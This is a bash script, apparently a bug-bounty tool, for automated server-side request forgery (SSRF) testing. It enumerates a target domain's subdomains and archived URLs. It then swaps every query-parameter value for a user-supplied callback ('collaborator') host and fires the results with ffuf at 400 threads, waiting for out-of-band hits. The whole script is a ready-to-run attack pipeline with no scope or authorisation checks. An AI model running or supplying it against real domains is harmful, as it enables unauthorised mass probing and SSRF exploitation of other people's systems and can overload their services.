#!/bin/bash

while getopts :d:c: fname; do

        case $fname in
                d) TARGET=$OPTARG;;
		c) collaborator=$OPTARG;;
                *) echo "Invalid Operation $OPTARG";;
        esac
done



subfinder -d $TARGET -silent | httpx -silent >> subdomains_found.txt



assetfinder --subs-only $TARGET | httpx -silent >> subdomains_found.txt



curl -sk "https://crt.sh/?q=$TARGET" | grep -oE "[a-zA-Z0-9._-]+\.$TARGET" | sed -e '/[A-Z]/d' -e '/*/d' | grep -oP '[a-z0-9]+\.[a-z]+\.[a-z]+' | httpx -silent >> subdomains_found.txt




cat subdomains_found.txt | sort -u >> final_subs.txt



gau -subs $TARGET >> urls.txt

gauplus -subs $TARGET -t 25 >> urls.txt

cat final_subs.txt | gauplus -t 25 >> urls.txt


waybackurls $TARGET >> urls.txt



cat final_subs.txt | waybackurls >> urls.txt



cat urls.txt | sort -u | httpx -silent >> allive.txt



cat allive.txt | grep "=" | grep "?" | qsreplace $collaborator >> ssrfuzz.txt


ffuf -c -w ssrfuzz.txt -u FUZZ -t 400


echo "KINDLY CHECK FOR HITS ON YOUR SERVER"
